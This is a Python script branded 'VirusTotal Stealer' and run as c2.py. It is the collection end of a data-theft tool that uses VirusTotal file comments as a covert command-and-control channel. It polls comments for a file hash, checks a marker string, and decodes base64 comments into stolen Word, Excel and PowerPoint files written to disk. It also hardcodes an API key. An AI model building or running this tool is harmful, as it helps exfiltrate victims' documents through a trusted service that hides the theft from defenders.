import os
import sys
import requests
import base64
import time
import art
import hashlib
import io
import zipfile
from termcolor import colored, cprint

# Your VirusTotal API key
API_KEY = '8b6e5ecfa72a0db4f9356f1bc55abe33d10ee8657f8a2a51bc7a528e518fe32f'

# VirusTotal API endpoint URL for retrieving comments
URL = 'https://www.virustotal.com/vtapi/v2/comments/get'
SPECIAL_STRING = r'C:\windows\system32'



def identify_office_file(file_content):
    try:
        with zipfile.ZipFile(io.BytesIO(file_content)) as zipped_file:
            if any(name.endswith('.rels') and 'word' in name for name in zipped_file.namelist()):
                return ".docx"
            elif any(name.endswith('.rels') and 'xl' in name for name in zipped_file.namelist()):
                return ".xlsx"
            elif any(name.endswith('.rels') and 'ppt' in name for name in zipped_file.namelist()):
                return ".pptx"
            else:
                return None
    except zipfile.BadZipFile:
        return None
    except Exception as e:
        print(f"An error occurred while identifying file: {str(e)}")
        return None




def print_status(message, color='white'):
    cprint(f"{message}", color)



def loading_indicator():
    symbols = ['|', '/', '-', '\\']
    while True:
        for symbol in symbols:
            yield symbol



def decode_and_write_file(encoded_comment, dir_name):
    try:
        file_content = base64.b64decode(encoded_comment)
        file_extension = identify_office_file(file_content)

        if file_extension is not None:
            sha256_hash = hashlib.sha256(file_content).hexdigest()
            filename = f"{sha256_hash}{file_extension}"

            os.makedirs(dir_name, exist_ok=True)

            with open(os.path.join(dir_name, filename), 'wb') as file:
                file.write(file_content)
                print(colored(f"\n[+] Written: {filename}\n", 'green'))
        else:
            print(colored("\n[-] File type could not be identified.\n", 'red'))
    except Exception as e:
        print(colored(f"\n[-] An error occurred: {str(e)}\n", 'red'))



def get_comments(file_hash):
    loader = loading_indicator()
    while True:
        print(colored(f"\r[ {next(loader)} ] Checking comments...\n", 'white'), end='', flush=True)
        params = {'apikey': API_KEY, 'resource': file_hash}
        response = requests.get(URL, params=params)

        if response.status_code == 200:
            json_response = response.json()
            if json_response.get('response_code') == 1 and json_response.get('comments'):
                first_comment = json_response['comments'][0]['comment']

                if first_comment == "This program cannot be run in DOS mode":
                    print_status("\n[+] Expected first comment found.\n", 'green')
                    
                    # Extract the directory name from the last comment
                    last_comment = json_response['comments'][-1]['comment']
                    dir_name = base64.b64decode(last_comment).decode('utf-8', 'ignore')

                    for comment in json_response['comments'][1:]:
                        decode_and_write_file(comment['comment'], dir_name)
                    break
                else:
                    print_status("\n[+] Expected comment not found. Sleeping...\n", 'yellow')
                    time.sleep(5)
            else:
                print_status(f"\n[+] No comments found for file hash {file_hash}. Sleeping...\n", 'yellow')
                time.sleep(5)
        else:
            print_status(f"\n[+] Failed to retrieve information from VirusTotal API (HTTP {response.status_code}). Sleeping...\n", 'red')
            time.sleep(5)



if __name__ == "__main__":
    print()
    print(colored("#################################################################################", "blue"))
    print()
    text_art = art.text2art("VirusTotal Stealer", font='cybermedium', chr_ignore=True)
    text_art_lines = text_art.split("\n\n")
    modified_text_art = "\n".join([line for line in text_art_lines if line.strip()])
    print(colored(modified_text_art, "blue"))
    print(colored("Drink Coffee, Enjoy Docs                      by D1rkmtr\n", "white"))
    print(colored("#################################################################################", "blue"))
    print()
    print()

    if len(sys.argv) < 2:
        print(colored("Usage: python3 c2.py <file_hash>\n\n", 'red'))
        sys.exit(1)

    FILE_HASH = sys.argv[1]

    get_comments(FILE_HASH)
